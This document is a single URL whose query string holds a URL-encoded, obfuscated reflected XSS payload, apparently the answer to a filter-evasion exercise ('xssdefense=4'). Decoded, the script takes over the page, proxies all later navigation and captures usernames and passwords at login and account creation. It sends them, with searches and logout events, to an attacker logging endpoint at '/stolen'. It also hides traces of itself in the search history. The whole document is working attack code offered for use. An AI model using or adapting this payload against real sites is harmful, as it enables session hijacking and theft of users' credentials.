http://permalink.co:8080/search?xssdefense=4&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%09%2F%2F%20Token%20for%20filter%20defc72a96803a619a6735cd7e7e69e1b%0A%09function%20log(attacker%2C%20data)%20%7B%0A%09%09console.log(%24.param(data))%3B%0A%09%09%24.get(attacker%2C%20data)%3B%0A%09%7D%0A%09function%20proxy(attacker%2C%20href%2C%20ifPushState)%20%7B%0A%09%09%24(String.fromCharCode(104%2C116%2C109%2C108)).load(href%2C%20function()%7B%0A%09%09%09var%20user%20%3D%20%24(String.fromCharCode(35%2C108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114))%3B%0A%09%09%09var%20username%20%3D%20user.text()%3B%0A%0A%09%09%09%24(String.fromCharCode(104%2C116%2C109%2C108)).show()%3B%0A%0A%09%09%09if%20(username%20%3D%3D%20String.fromCharCode())%20%7B%0A%09%09%09%09log(attacker%2C%20%7Bevent%3A%20String.fromCharCode(110%2C97%2C118)%2C%20uri%3A%20href%7D)%3B%0A%09%09%09%7D%20else%20%7B%0A%09%09%09%09log(attacker%2C%20%7Bevent%3A%20String.fromCharCode(110%2C97%2C118)%2C%20user%3A%20username%2C%20uri%3A%20href%7D)%3B%0A%09%09%09%7D%0A%0A%09%09%09filterSearch()%3B%0A%09%09%09handleClick()%3B%0A%09%09%09if%20(ifPushState)%20%7B%0A%09%09%09%09history.pushState(href%2C%20document.title%2C%20href)%3B%0A%09%09%09%7D%0A%09%09%7D)%3B%0A%09%7D%0A%0A%09function%20handleClick()%20%7B%0A%09%09%24(String.fromCharCode(35%2C115%2C101%2C97%2C114%2C99%2C104%2C45%2C98%2C116%2C110)).click(onSearch)%3B%0A%09%09%24(String.fromCharCode(35%2C115%2C101%2C97%2C114%2C99%2C104%2C45%2C97%2C103%2C97%2C105%2C110%2C45%2C98%2C116%2C110)).click(onSearchAgain)%3B%0A%09%09%24(String.fromCharCode(35%2C108%2C111%2C103%2C45%2C105%2C110%2C45%2C98%2C116%2C110)).click(onLogin)%3B%0A%09%09%24(String.fromCharCode(35%2C110%2C101%2C119%2C45%2C97%2C99%2C99%2C111%2C117%2C110%2C116%2C45%2C98%2C116%2C110)).click(onCreate)%3B%0A%09%09%24(String.fromCharCode(35%2C108%2C111%2C103%2C45%2C111%2C117%2C116%2C45%2C98%2C116%2C110)).click(onLogout)%3B%0A%09%7D%0A%0A%09function%20filterSearch()%20%7B%0A%09%09var%20historyList%20%3D%20%24(String.fromCharCode(35%2C104%2C105%2C115%2C116%2C111%2C114%2C121%2C45%2C108%2C105%2C115%2C116%2C32%2C97))%3B%0A%09%09if%20(historyList.length%20%3D%3D%200)%20%7B%0A%09%09%09return%3B%0A%09%09%7D%0A%09%09var%20i%20%3D%200%3B%0A%09%09while%20(i%20%3C%20historyList.length)%20%7B%0A%09%09%09if%20(historyList%5Bi%5D.text.indexOf(String.fromCharCode(100%2C101%2C102%2C99%2C55%2C50%2C97%2C57%2C54%2C56%2C48%2C51%2C97%2C54%2C49%2C57%2C97%2C54%2C55%2C51%2C53%2C99%2C100%2C55%2C101%2C55%2C101%2C54%2C57%2C101%2C49%2C98))%20!%3D%20-1)%20%7B%0A%09%09%09%09historyList%5Bi%5D.style.display%20%3D%20String.fromCharCode(110%2C111%2C110%2C101)%3B%0A%09%09%09%7D%0A%09%09%09i%20%2B%2B%3B%0A%09%09%7D%0A%09%7D%0A%0A%09function%20onSearch(event)%20%7B%0A%09%09var%20query%20%3D%20%24(String.fromCharCode(35%2C113%2C117%2C101%2C114%2C121)).val()%3B%0A%09%09var%20url%20%3D%20String.fromCharCode(46%2C47%2C115%2C101%2C97%2C114%2C99%2C104%2C63%2C113%2C61)%20%2B%20query%3B%0A%09%09proxy(attacker%2C%20url%2C%20true)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20onSearchAgain(event)%20%7B%0A%09%09proxy(attacker%2C%20String.fromCharCode(46%2C47)%2C%20true)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20onLogin(event)%20%7B%0A%09%09loginHelper(String.fromCharCode(46%2C47%2C108%2C111%2C103%2C105%2C110))%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20onCreate(event)%20%7B%0A%09%09loginHelper(String.fromCharCode(46%2C47%2C99%2C114%2C101%2C97%2C116%2C101))%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20loginHelper(action)%20%7B%0A%09%09var%20username%20%3D%20%24(String.fromCharCode(35%2C117%2C115%2C101%2C114%2C110%2C97%2C109%2C101)).val()%3B%0A%09%09var%20password%20%3D%20%24(String.fromCharCode(35%2C117%2C115%2C101%2C114%2C112%2C97%2C115%2C115)).val()%3B%0A%09%09var%20data%20%3D%20%7Busername%3A%20username%2C%20password%3A%20password%7D%3B%0A%0A%09%09log(attacker%2C%20%7Bevent%3A%20String.fromCharCode(108%2C111%2C103%2C105%2C110)%2C%20user%3A%20username%2C%20pass%3A%20password%7D)%3B%0A%09%09%24.post(action%2C%20data%2C%20function()%20%7B%0A%09%09%09proxy(attacker%2C%20String.fromCharCode(46%2C47)%2C%20true)%3B%0A%09%09%7D)%0A%09%7D%0A%0A%09function%20onLogout(event)%20%7B%0A%09%09var%20user%20%3D%20%24(String.fromCharCode(35%2C108%2C111%2C103%2C103%2C101%2C100%2C45%2C105%2C110%2C45%2C117%2C115%2C101%2C114))%3B%0A%09%09var%20username%20%3D%20user.text()%3B%0A%09%09log(attacker%2C%20%7Bevent%3A%20String.fromCharCode(108%2C111%2C103%2C111%2C117%2C116)%2C%20user%3A%20username%7D)%3B%0A%09%09%24.post(String.fromCharCode(46%2C47%2C108%2C111%2C103%2C111%2C117%2C116)%2C%20function()%20%7B%0A%09%09%09proxy(attacker%2C%20String.fromCharCode(46%2C47)%2C%20true)%3B%0A%09%09%7D)%3B%0A%09%09event.preventDefault()%3B%0A%09%7D%0A%0A%09function%20bootstrap()%20%7B%0A%09%09var%20url%20%3D%20String.fromCharCode(46%2C47)%3B%0A%09%09%24(String.fromCharCode(104%2C116%2C109%2C108)).hide()%3B%0A%09%09proxy(attacker%2C%20url%2C%20false)%3B%0A%09%09history.replaceState(url%2C%20document.title%2C%20url)%3B%0A%09%7D%0A%0A%09window.onpopstate%20%3D%20function(event)%20%7B%0A%20%20%09%09proxy(attacker%2C%20event.state%2C%20false)%3B%0A%09%7D%3B%0A%0A%09bootstrap()%3B%0A%7D%3Bpayload(String.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C49%2C50%2C55%2C46%2C48%2C46%2C48%2C46%2C49%2C58%2C51%2C49%2C51%2C51%2C55%2C47%2C115%2C116%2C111%2C108%2C101%2C110))%3B%3C%2Fscript%3E